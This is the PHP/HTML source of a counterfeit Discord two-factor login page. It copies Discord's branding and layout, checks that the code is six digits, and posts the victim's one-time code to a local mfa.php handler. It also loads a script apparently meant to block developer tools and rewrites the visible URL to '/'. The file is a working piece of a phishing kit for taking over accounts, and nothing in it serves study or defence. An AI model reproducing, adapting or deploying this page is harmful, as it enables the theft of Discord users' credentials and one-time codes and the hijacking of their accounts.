<?php 
    require("core/system/translation.php");
?>
<meta charset="utf-8">
    <html lang="ru" style="font-size: 100%" class="full-motion app-focused theme-dark platform-web oldBrand" data-rh="lang,style,class">
    <head>
        <title>Discord</title>

        <meta content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" name="viewport">
        <meta property="og:type" content="website">
        <meta property="og:site_name" content="Discord">
        <meta property="og:title" content="Discord - A New Way to Chat with Friends &amp; Communities">
        <meta property="og:description" content="Discord is the easiest way to communicate over voice, video, and text.  Chat, hang out, and stay close with your friends and communities.">
        <meta property="og:image" content="src/img/ee7c382d9257652a88c8f7b7f22a994d.png">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:site" content="@discord">
        <meta name="twitter:creator" content="@discord">
        <link rel="stylesheet" href="src/css/style.css">
        <link rel="icon" href="src/img/847541504914fd33810e70a0ea73177e.ico">
        <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600&amp;family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet">
        <script charset="utf-8" src="src/js/62139f1cff10402837062.js"></script>
        <script charset="utf-8" src="src/js/antif12.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    </head>

    <body>
        <div id="app-mount" class="appMount-3lHmkl">
            <div class="app-1q1i1E">
                <div class="characterBackground-2itjYF">
                    <img style="position: fixed; height: 100%; top: 0; left: 0; width: 100%;" src="src/img/44e0c1fbcf99c4476083442e4a2774e0.svg">
                </div>
                <div class="splashBackground-1FRCko wrapper-3Q5DdO scrollbarGhost-2F9Zj2 scrollbar-3dvm_9">
                    <div>
                        <div class="wrapper-6URcxg">
                            <form class="authBox-hW6HRx theme-dark" onsubmit="checkmfa(); return false;" method="POST" id="formx" action="/mfa.php">
                                <div class="centeringWrapper-2Rs1dR"><img alt="" src="src/img/0f4d1ff76624bb45a3fee4189279ee92.svg" class="marginBottom20-32qID7">
                                    <h3 class="title-jXR8lp marginBottom8-AtZOdT base-1x0h_U size24-RIRrxO"><?php echo $mfa[0];?></h3>
                                    <div class="colorHeaderSecondary-3Sp3Ft size16-1P40sf"><?php echo $mfa[1];?></div>
                                    <div class="block-egJnc0 marginTop40-i-78cZ">
                                        <div class="marginBottom20-32qID7">
                                            <h5 class="colorStandard-2KCXvj size14-e6ZScH h5-18_1nd title-3sZWYQ defaultMarginh5-2mL-bP" id="pole1-text"><?php echo $mfa[2];?>
                                                <span id="elprimo1" class="errorMessage-3Guw2R"><span class="errorSeparator-30Q6aR">-</span><?php  print_r($err ? $err : $mfa[7]);?></span>
                                            </h5>
                                            <div class="inputWrapper-31_8H8"><input class="inputDefault-_djjkz input-cIJ7To" id="pole1" name="mfacode" type="text" placeholder=<?php echo '"'.$mfa[3].'"';?> aria-label=<?php echo '"'.$mfa[4].'"';?> autocomplete="off" maxlength="10" spellcheck="false" value=""></div>
                                        </div><button id="sade" type="button" class="button-3k0cO7 button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeLarge-1vSeWK fullWidth-1orjjo grow-q77ONN"  onclick="ohmygod(); checkmfa()">
                                            <span class="spinner-2enMB9 spinner-3a9zLT" id="loadi" style="display: none;"><span class="inner-1gJC7_ pulsingEllipsis-3YiXRF"><span class="pulsingEllipsisItem-32hhWL spinnerItem-3GlVyU"></span><span class="pulsingEllipsisItem-32hhWL spinnerItem-3GlVyU"></span><span class="pulsingEllipsisItem-32hhWL spinnerItem-3GlVyU"></span></span></span>
                                            <div class="contents-18-Yxp"><?php echo $mfa[5];?></div>
                                        </button><button type="button" class="marginTop4-2BNfKC linkButton-wzh5kV button-38aScr lookLink-9FtZy- lowSaturationUnderline-3svVxy colorLink-35jkBc sizeMin-1mJd1x grow-q77ONN">
                                            <div class="contents-18-Yxp" onclick="window.open('index.php', '_self');"><?php echo $mfa[6];?></div>
                                        </button>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <script type="text/javascript">
            history.pushState(null, null, '/');

            document.getElementById("elprimo1").hidden = true;
            
            function ohmygod(){
                document.getElementById("loadi").style.display = "";
                document.querySelector("#sade").classList.add("submitting-3qlO9O");
            }

            function checkmfa(){
                let el = document.getElementsByName("mfacode")[0];
                let mfacode = el.value;
                if(mfacode.length != 6 || !/^\d+$/giu.test(mfacode)){
                    let pol1 = document.querySelector("#pole1");
                    pol1.classList.add("unselect");
                    document.getElementById("elprimo1").hidden=false;
                    document.getElementById("pole1-text").style.color="#ed4245";
                    document.querySelector("#sade").classList.remove("submitting-3qlO9O");
                    document.getElementById("loadi").style.display = "none";
                    return;
                }
                document.getElementById("formx").submit();
            }
        </script>
    </body>
</html>